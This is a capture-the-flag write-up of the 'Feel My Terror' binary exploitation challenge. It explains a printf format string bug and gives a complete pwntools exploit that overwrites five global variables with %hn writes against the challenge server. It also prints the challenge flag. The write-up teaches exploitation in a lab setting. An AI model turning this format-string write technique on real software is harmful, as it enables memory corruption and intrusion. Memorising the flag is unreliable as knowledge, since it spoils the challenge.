# Feel My Terror - CTF PWN Challenge Writeup

---

The challenge description states:
> "These mischievous elves have scrambled the good kids' addresses! Now the presents can't find their way home. Please help me fix them quickly — I can't sort this out on my own."

We're given a binary file called `feel_my_terror` and need to exploit it to retrieve the flag.

## Initial Reconnaissance

### Step 1: Identify the Binary Type

First, let's check what kind of file we're dealing with:

```bash
$ file feel_my_terror
feel_my_terror: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0279c438d7336af633d04b39a9271e3a60746262, 
for GNU/Linux 3.2.0, not stripped
```

**Key Information:**
- **ELF 64-bit**: This is a Linux executable for 64-bit systems
- **LSB (Least Significant Byte first)**: Little-endian architecture
- **Dynamically linked**: Uses shared libraries
- **Not stripped**: Debug symbols are present, making analysis easier

### Step 2: Check Security Protections

We use `checksec` to see what security mechanisms are enabled:

```bash
$ checksec --file=feel_my_terror
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH
```

**Understanding the Protections:**

- **Full RELRO** (Relocation Read-Only): GOT (Global Offset Table) is read-only, preventing GOT overwrite attacks
- **Stack Canary**: Protects against basic buffer overflows on the stack
- **NX enabled** (No-eXecute): Stack is not executable, preventing shellcode execution
- **No PIE** (Position Independent Executable): Binary loads at a fixed address (0x400000), making addresses predictable
- **No RPATH/RUNPATH**: No hardcoded library search paths

**Important**: No PIE means we know exactly where global variables are located in memory!

---

## Binary Analysis

### Step 3: Run the Binary

Let's see what the program does:

```bash
$ ./feel_my_terror
```

**Output:**
```
⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠤⠶⣶⣶⠋⠳⡄⠀⠀ 
⠀⠀⠀⠀⠀⢀⡖⠉⠀⠀⡰⠻⡅⠙⠲⠞⠁⠀⠀⠀
[... ASCII art of an elf ...]

[Nibbletop] Look at the mess the ELVES made:

--------------------
Address 1: 0x964d606
Address 2: 0x1f6536a
Address 3: 0x67d8018
Address 4: 0x20ba026
Address 5: 0xca47804
--------------------

[Nibbletop] Please fix the addresses to help me deliver the gifts :)

> test

[Nibbletop] I hope the addresses you gave me are correct..

test

[Nibbletop] Checking the database...

[Nibbletop] All people do is LIE!
```

**Observations:**
1. The program displays 5 "scrambled" addresses
2. It asks for user input
3. It prints back our input (important!)
4. It checks something and gives an error message

### Step 4: Disassemble Key Functions

```bash
$ objdump -M intel -d feel_my_terror | grep -A 100 '<main>:'
```

**Main Function Flow:**
1. Calls `banner()` - displays the ASCII art
2. Calls `randomizer()` - generates random values
3. Displays the scrambled addresses (from arg1-arg5 global variables)
4. Reads user input (up to 0xc5 = 197 bytes) into a buffer
5. **Calls `printf()` with our input** ← This is suspicious!
6. Calls `check_db()` to verify something

### Step 5: Analyze the `randomizer()` Function

```assembly
0000000000401949 <randomizer>:
  401949:  ...
  401964:  mov    edi,0x0
  401969:  call   4011f0 <time@plt>        ; Get current time
  40196e:  mov    edi,eax
  401970:  call   4011e0 <srand@plt>       ; Seed random number generator
  401975:  call   401250 <rand@plt>        ; Generate random number
  ...
  401993:  mov    DWORD PTR [rip+0x2693],eax  ; Store in arg1 (0x40402c)
```

**What it does:**
- Seeds the random number generator with current time
- Generates 5 random numbers
- Stores them in global variables: `arg1`, `arg2`, `arg3`, `arg4`, `arg5`

### Step 6: Analyze the `check_db()` Function

This is the critical function that checks if we "fixed" the addresses:

```assembly
0000000000401a40 <check_db>:
  ...
  401ad7:  mov    eax,DWORD PTR [rip+0x254f]    ; Load arg1
  401add:  cmp    eax,0xdeadbeef                ; Compare with 0xdeadbeef
  401ae2:  jne    401b44                        ; Jump if not equal
  401ae4:  mov    eax,DWORD PTR [rip+0x254a]    ; Load arg2
  401aea:  cmp    eax,0x1337c0de                ; Compare with 0x1337c0de
  401aef:  jne    401b44                        ; Jump if not equal
  401af1:  mov    eax,DWORD PTR [rip+0x2545]    ; Load arg3
  401af7:  cmp    eax,0xf337babe                ; Compare with 0xf337babe
  401afc:  jne    401b44                        ; Jump if not equal
  401afe:  mov    eax,DWORD PTR [rip+0x2540]    ; Load arg4
  401b04:  cmp    eax,0x1337f337                ; Compare with 0x1337f337
  401b09:  jne    401b44                        ; Jump if not equal
  401b0b:  mov    eax,DWORD PTR [rip+0x253b]    ; Load arg5
  401b11:  cmp    eax,0xfadeeeed                ; Compare with 0xfadeeeed
  401b16:  jne    401b44                        ; Jump if not equal
  401b18:  ...
  401b27:  call   40169b <success>              ; Call success function!
```

**Key Discovery:**

The program checks if the 5 global variables match these specific "magic" values:
- `arg1` (at address 0x40402c) must equal **0xdeadbeef**
- `arg2` (at address 0x404034) must equal **0x1337c0de**
- `arg3` (at address 0x40403c) must equal **0xf337babe**
- `arg4` (at address 0x404044) must equal **0x1337f337**
- `arg5` (at address 0x40404c) must equal **0xfadeeeed**

If all checks pass, it calls the `success()` function which likely prints the flag!

---

## Understanding the Vulnerability

### Step 7: Identify the Format String Bug

Looking at the main function, around address `0x401d11`:

```assembly
401d02:  lea    rax,[rbp-0xd0]         ; Load address of our input buffer
401d09:  mov    rdi,rax                 ; Move it to RDI (first argument)
401d0c:  mov    eax,0x0                 ; Clear EAX
401d11:  call   4011a0 <printf@plt>    ; Call printf!
```

**The Bug:**

The program calls `printf()` with our input as the **first argument** without a format string! This is equivalent to:

```c
printf(user_input);  // VULNERABLE!
```

Instead of:
```c
printf("%s", user_input);  // SAFE
```

### What is a Format String Vulnerability?

**Format strings** are used in functions like `printf()` to format output:
- `%d` - Print an integer
- `%s` - Print a string
- `%p` - Print a pointer (memory address)
- `%x` - Print in hexadecimal
- `%n` - **Write the number of bytes printed so far to a memory address**

When user input is passed directly to `printf()`, an attacker can:
1. **Read memory** using `%p`, `%x`, `%s`
2. **Write memory** using `%n`

### Step 8: Test the Vulnerability

Let's verify the format string bug:

```python
from pwn import *

io = process("./feel_my_terror")
io.recvuntil(b"> ")
io.sendline(b"AAAA" + b"%p."*20)  # Send "AAAA" followed by 20 %p
print(io.recvall().decode())
```

**Output:**
```
AAAA(nil).0x7ffde2584d40.0x76efc0864687.(nil).(nil).0x252e702541414141...
```

Notice: `0x252e702541414141`

Let's decode this hex value:
- `0x41414141` = "AAAA" (our input!)
- `0x252e7025` = "%p.%"

**This confirms our input is at position 6 on the stack!**

---

## Exploitation Strategy

### Our Goal

We need to overwrite the 5 global variables (`arg1` through `arg5`) with their magic values using the format string vulnerability.

### How `%n` Works

The `%n` format specifier writes the **number of characters printed so far** to a memory address.

**Example:**
```c
int count;
printf("Hello%n", &count);  // count = 5 (length of "Hello")
```

### Format String Payload Structure

To write to an arbitrary address:
1. Place the **target address** on the stack (at our controlled offset)
2. Use format string to navigate to that address
3. Use `%n` (or variants) to write a value

**Variants of %n:**
- `%n` - Write 4 bytes (32-bit)
- `%hn` - Write 2 bytes (16-bit) - **We'll use this!**
- `%hhn` - Write 1 byte (8-bit)

### Why Use `%hn` (Short Write)?

Writing full 32-bit values with `%n` would require printing billions of characters (e.g., 0xdeadbeef = 3,735,928,559 characters!). 

Instead, we write 2 bytes at a time:
- Write **0xbeef** to address `0x40402c`
- Write **0xdead** to address `0x40402c + 2`

This is more efficient and practical!

---

## Writing the Exploit

### Step 9: Install Required Tools

```bash
pip3 install pwntools
```

### Step 10: Create the Exploit Script

Let's build our exploit step by step:

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
REMOTE = True  # Set to True for remote server, False for local testing
HOST = "154.57.164.77"
PORT = 30331

context.arch = 'amd64'  # Set architecture to 64-bit
context.log_level = 'info'  # Show informational messages

# Connect to target
if REMOTE:
    io = remote(HOST, PORT)
else:
    io = process("./feel_my_terror")

# Receive the banner and prompt
io.recvuntil(b"> ")

# Define the target addresses and values
writes = {
    0x40402c: 0xdeadbeef,  # arg1
    0x404034: 0x1337c0de,  # arg2
    0x40403c: 0xf337babe,  # arg3
    0x404044: 0x1337f337,  # arg4
    0x40404c: 0xfadeeeed   # arg5
}

# Generate format string payload
# Offset 6: Position of our buffer on the stack
# write_size='short': Use %hn to write 2 bytes at a time
payload = fmtstr_payload(6, writes, write_size='short')

print(f"[+] Payload length: {len(payload)}")
print(f"[+] Sending format string exploit...")
io.sendline(payload)

# Get the flag!
io.interactive()
```

### Understanding the Exploit Script Line by Line

#### Import and Configuration
```python
from pwn import *
```
- Imports the pwntools library, which provides utilities for exploit development

```python
REMOTE = True
HOST = "154.57.164.77"
PORT = 30331
```
- Configuration to switch between local testing and remote exploitation

#### Context Setup
```python
context.arch = 'amd64'
context.log_level = 'info'
```
- `context.arch`: Tells pwntools we're targeting a 64-bit architecture
- `context.log_level`: Controls verbosity of output

#### Connection
```python
if REMOTE:
    io = remote(HOST, PORT)
else:
    io = process("./feel_my_terror")
```
- Creates a connection to either the remote server or local binary
- `io` is our communication channel

#### Receive Prompt
```python
io.recvuntil(b"> ")
```
- Waits for and receives data until we see the `"> "` prompt
- `b"..."` indicates a byte string (required for binary protocols)

#### Define Targets
```python
writes = {
    0x40402c: 0xdeadbeef,  # arg1
    0x404034: 0x1337c0de,  # arg2
    0x40403c: 0xf337babe,  # arg3
    0x404044: 0x1337f337,  # arg4
    0x40404c: 0xfadeeeed   # arg5
}
```
- Dictionary mapping **memory addresses** (keys) to **values we want to write** (values)
- These are the exact addresses and magic values discovered during analysis

#### Generate Payload
```python
payload = fmtstr_payload(6, writes, write_size='short')
```

**This is the magic line!** Let's break it down:

- `fmtstr_payload()`: Pwntools function that automatically generates a format string exploit
- `6`: Stack offset where our buffer is located (discovered during testing)
- `writes`: Dictionary of addresses and values to write
- `write_size='short'`: Use `%hn` to write 2 bytes at a time

**What does this function do internally?**

It generates a payload like:
```
[address1][address2][address3]...[format string codes]
```

For example, to write 0xbeef to 0x40402c:
1. Put address 0x40402c on the stack
2. Print (0xbeef - bytes_already_printed) characters
3. Use %6$hn to write to the 6th parameter (our address)

#### Send and Receive
```python
io.sendline(payload)
io.interactive()
```
- `sendline()`: Sends the payload followed by a newline
- `interactive()`: Gives us an interactive shell to see the output

---

## Getting the Flag

### Step 11: Run the Exploit

```bash
$ python3 solve.py
```

**Output:**
```
[+] Opening connection to 154.57.164.77 on port 30331: Done
[+] Payload length: 200
[+] Sending format string exploit...
[*] Switching to interactive mode

[Nibbletop] I hope the addresses you gave me are correct..

[... format string output ...]

[Nibbletop] Checking the database...

[Nibbletop] Thanks a lot my friend <3. Take this gift from me: 
HTB{1_l0v3_chr15tm45_&_h4t3_fmt}
```

**Flag: `HTB{1_l0v3_chr15tm45_&_h4t3_fmt}`**

---
